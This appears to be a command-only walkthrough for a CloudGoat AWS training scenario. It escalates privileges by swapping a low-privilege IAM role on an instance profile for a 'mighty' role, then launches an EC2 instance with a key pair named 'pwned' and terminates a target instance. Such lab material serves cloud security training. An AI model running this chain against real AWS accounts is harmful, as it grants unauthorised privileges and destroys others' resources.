`aws configure --profile Scenario3_user`

`aws ec2 describe-instances --profile Scenario3_user`

`aws iam list-instance-profiles --profile Scenario3_user`

`aws iam list-roles --profile Scenario3_user`

`aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> --role-name cg-ec2-meek-role-<cloudgoat_id> --profile Scenario3_user`

`aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> --role-name cg-ec2-mighty-role-<cloudgoat_id> --profile Scenario3_user`

`aws ec2 create-key-pair --key-name pwned --profile Scenario3_user`

`aws ec2 describe-subnets --profile Scenario3_user`

`aws ec2 describe-security-groups --profile Scenario3_user`

`aws ec2 run-instances --image-id ami-0718a1ae90971ce4d --iam-instance-profile Arn=<instanceProfileArn> --key-name scenario3_user --profile scenario3_user --subnet-id <subnetId> --security-group-ids <securityGroupId>`

`sudo apt-get update`

`sudo apt-get install awscli`

`aws ec2 describe-instances --region eu-central-1`

`aws ec2 terminate-instances --instance-ids <instanceId> --region eu-central-1`
